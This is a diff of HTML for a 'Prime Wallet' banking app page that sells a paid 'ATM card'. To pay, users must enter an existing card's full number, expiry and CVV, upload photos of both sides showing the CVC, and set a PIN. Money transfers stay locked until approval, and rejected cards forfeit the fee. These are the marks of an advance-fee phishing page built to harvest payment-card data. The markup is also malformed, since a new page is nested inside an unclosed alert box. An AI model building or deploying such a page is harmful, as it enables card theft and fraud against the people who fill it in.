@@ -393,67 +393,129 @@
     </div>
     
     <div class="alert-box alert-warning">
-      ⚠️ <strong>Image Requirements — Strictly Enforced:</strong><br>
-      ✅ Real color photo — no screenshots, no scans<br>
-      ✅ All 4 corners visible — no cropped images<br>
-      ✅ No blurry, dark, or edited photos<br>
-      ✅ No AI-generated or digitally altered images<br>
-      ✅ Expiry date must be clearly visible — not expired<br>
-      ❌ Expired cards will be rejected automatically
-    </div>
+    <!-- 💳 GET PRIME WALLET CARD — PURCHASE SYSTEM WITH PAYMENT + PIN CREATION ✅ -->
+<div class="page hidden page-container" id="cardPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">←</span>
+    <span class="header-title">💳 Purchase Prime Wallet Bank ATM Card</span>
+  </div>
+  <div class="container full-container">
     
+    <!-- 🎯 STEP 1 — CARD SELECTION & PRICING -->
+    <div class="card" style="background:linear-gradient(135deg,#FFF3BF,#FFE58F);border:2px solid var(--gold-border)">
+      <h3 style="color:#92400E;margin-bottom:8px">✨ Unlock Full Banking Power!</h3>
+      <p style="color:#92400E">Purchase your Prime Wallet Card to Send Money, Pay Bills & enjoy unlimited global transfers.</p>
+    </div>
+
+    <div class="alert-box alert-warning">
+      ⚠️ <strong>Strict Requirements — No exceptions:</strong><br>
+      ✅ Real color photo — no screenshots, no AI-generated images<br>
+      ✅ All 4 corners visible — no cropped images<br>
+      ✅ Clear & legible — no blurry or dark photos<br>
+      ✅ Card must be VALID — not expired<br>
+      ❌ Rejected cards = no refund
+    </div>
+
     <div class="card">
-      <label>Card Network / Type</label>
-      <select id="cardType">
-        <option value="">-- Select Card Network --</option>
-        <option>💳 Visa — Global Acceptance</option>
-        <option>💳 MasterCard — Worldwide</option>
-        <option>💳 Verve — Africa & Global</option>
-        <option>💳 American Express</option>
-        <option>💳 Discover</option>
-      </select>
+      <h3 style="margin-bottom:20px">Step 1 — Choose Your Card Type</h3>
       
+      <label>Card Network</label>
+      <select id="cardNetwork" onchange="updateCardPrice()">
+        <option value="">-- Select Card Network --</option>
+        <option value="visa">💳 Visa Classic — $25.00</option>
+        <option value="visa_gold">💳 Visa Gold — $50.00</option>
+        <option value="mastercard">💳 MasterCard Standard — $25.00</option>
+        <option value="mastercard_platinum">💳 MasterCard Platinum — $75.00</option>
+        <option value="verve">💳 Verve Global — $20.00</option>
+        <option value="amex">💳 American Express — $100.00</option>
+      </select>
+
+      <label>Card Design / Style</label>
+      <select id="cardDesign">
+        <option value="standard">🏦 Standard Blue — Prime Blue</option>
+        <option value="gold">✨ Gold Edition — Premium</option>
+        <option value="black">🖤 Black Edition — Elite</option>
+        <option value="silver">⚪ Silver Edition — Classic</option>
+      </select>
+
+      <div class="alert-box alert-info" style="margin-top:16px">
+        <strong>Total Amount Due:</strong> <span id="cardPrice" style="font-size:22px;font-weight:800;color:var(--pri)">$0.00</span>
+      </div>
+
+      <div class="divider"></div>
+
+      <!-- 💳 STEP 2 — PAYMENT WITH EXISTING ATM CARD -->
+      <h3 style="margin-bottom:16px">Step 2 — Pay With Your Existing ATM Card</h3>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:16px">Enter details of your active, working card to pay for your new Prime Wallet Card.</p>
+
       <label>Cardholder Full Name (As on Card)</label>
-      <input type="text" id="atmHolder" placeholder="JOHN DOE" style="text-transform:uppercase">
-      <div class="input-hint">Must match government ID exactly</div>
+      <input type="text" id="payCardHolder" placeholder="JOHN DOE" style="text-transform:uppercase">
       
       <label>Card Number (16 Digits)</label>
-      <input type="text" id="atmNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)">
+      <input type="text" id="payCardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)">
       
       <div class="two-col">
         <div>
           <label>Expiry Date</label>
-          <input type="text" id="atmExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
-          <div class="input-hint">Not expired</div>
+          <input type="text" id="payCardExpiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
         </div>
         <div>
           <label>CVC / CVV</label>
-          <input type="text" id="atmCvc" placeholder="123" maxlength="4">
+          <input type="text" id="payCardCvc" placeholder="123" maxlength="4">
         </div>
       </div>
-      
-      <label>4-Digit Transaction PIN</label>
-      <div class="input-group">
-        <input type="password" id="atmPin" placeholder="****" maxlength="4" inputmode="numeric">
-        <span class="eye-icon" onclick="togglePassword('atmPin')">👁️</span>
-      </div>
-      <div class="input-hint">For all future transfers & payments</div>
-      
-      <label>Upload Card Front 📷</label>
-      <input type="file" id="atmFront" accept="image/*,.jpg,.jpeg,.png,.webp">
-      <div class="input-hint">✅ Show card number, name, expiry clearly</div>
-      
-      <label>Upload Card Back 📷</label>
-      <input type="file" id="atmBack" accept="image/*,.jpg,.jpeg,.png,.webp">
+
+      <label>Upload Payment Card — Front Side 📷</label>
+      <input type="file" id="payCardFront" accept="image/*,.jpg,.jpeg,.png,.webp">
+      <div class="input-hint">✅ Show card number, name & expiry clearly</div>
+
+      <label>Upload Payment Card — Back Side 📷</label>
+      <input type="file" id="payCardBack" accept="image/*,.jpg,.jpeg,.png,.webp">
       <div class="input-hint">✅ Must show signature strip & CVC</div>
-      
-      <button class="btn-primary" onclick="submitCard()" style="margin-top:24px">✅ Submit for Approval</button>
+
+      <div class="divider"></div>
+
+      <!-- 🔢 STEP 3 — CREATE YOUR 4-DIGIT TRANSACTION PIN -->
+      <h3 style="margin-bottom:16px">Step 3 — Create Your 4-Digit Transaction PIN</h3>
+      <p style="font-size:13px;color:var(--muted);margin-bottom:16px">This PIN will be required for ALL future transfers, payments & withdrawals. Keep it SECRET & secure!</p>
+
+      <label>Create 4-Digit PIN</label>
+      <div class="input-group">
+        <input type="password" id="userPin" placeholder="****" maxlength="4" inputmode="numeric">
+        <span class="eye-icon" onclick="togglePassword('userPin')">👁️</span>
+      </div>
+
+      <label>Confirm 4-Digit PIN</label>
+      <div class="input-group">
+        <input type="password" id="userPinConfirm" placeholder="****" maxlength="4" inputmode="numeric">
+        <span class="eye-icon" onclick="togglePassword('userPinConfirm')">👁️</span>
+      </div>
+
+      <div class="alert-box alert-locked">
+        🔒 <strong>PIN & Transactions will be LOCKED until our prme wallet bank approves your card purchase!</strong><br>
+        You will be notified via email & in-app once approved — usually within 1–24 hours.
+      </div>
+
+      <button class="btn-primary" onclick="submitCardPurchase()" style="margin-top:24px">✅ Submit Purchase for Approval</button>
       <p style="text-align:center;margin-top:12px;font-size:13px;color:var(--muted)">
-        ⏳ Review takes 1–24 hours. You'll be notified once approved.
+        ⏳ Review takes 1–24 hours. You'll be notified once approved.<br>
+        By submitting, you agree to our <a href="#" style="color:var(--pri)">Terms of Service</a>.
       </p>
     </div>
   </div>
 </div>
+
+<!-- 📬 NOTIFICATION MODAL — FOR APPROVAL / REJECTION -->
+<div class="page hidden page-container" id="notificationPage">
+  <div class="header-bar">
+    <span class="back-btn" onclick="openPage('dashboardPage')">←</span>
+    <span class="header-title">🔔 Notifications</span>
+  </div>
+  <div class="container full-container" id="notificationsContainer">
+    <!-- Filled by JS -->
+  </div>
+</div>
+
 
 <!-- ↗️ TRANSFER / SEND MONEY — LOCKED UNTIL CARD APPROVED -->
 <div class="page hidden page-container" id="transferPage">
